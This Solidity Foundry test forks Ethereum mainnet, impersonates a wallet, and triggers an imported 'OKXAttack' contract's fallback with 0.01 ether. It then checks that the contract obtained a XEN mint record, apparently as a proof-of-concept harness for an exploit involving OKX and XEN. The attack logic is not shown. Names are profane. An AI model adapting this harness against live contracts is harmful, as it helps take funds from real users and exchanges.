// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import {OKXAttack} from "../src/FuckOKX.sol";

contract FuckWithXen is Test {

    uint256 mainnetFork;
    address public forkWallet = 0xA4f6638Cde88f245B75670B510FD8e46fAFD1678;
    OKXAttack fuckOKX = new OKXAttack();

    address public xen = 0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8;

    struct MintInfo {
    address user;
    uint256 term;
    uint256 maturityTs;
    uint256 rank;
    uint256 amplifier;
    uint256 eaaRate;
    }

    function setUp() public {
        mainnetFork = vm.createFork('https://eth-mainnet.g.alchemy.com/v2/');
        // goerliFork = vm.createFork('https://eth-goerli.g.alchemy.com/v2/');
        vm.selectFork(mainnetFork);
        vm.startPrank(forkWallet);
        fuckOKX = new OKXAttack();
    }

    function testFallBack() public {
        // address(fuckOKX).transfer(0);
        MintInfo memory mintInfo;

        (bool success, ) = payable(address(fuckOKX)).call{value: 0.01 ether}("");
        require(success, "Mingxing XU is released!");
        console.log("After claim: %s", forkWallet.balance);

        assertTrue(success);
        (bool yes, bytes memory returnInfo) = xen.staticcall(abi.encodeWithSignature("userMints(address)", address(fuckOKX)));
        require(yes, "failed");
        mintInfo = abi.decode(returnInfo, (MintInfo));
        address mintAddr = mintInfo.user;
        console.log("Mint address is: %s", mintAddr);
        assertTrue(mintAddr != address(0));
        assertEq(mintAddr, address(fuckOKX));

        console.log("After destruct: %s", forkWallet.balance);
    }
}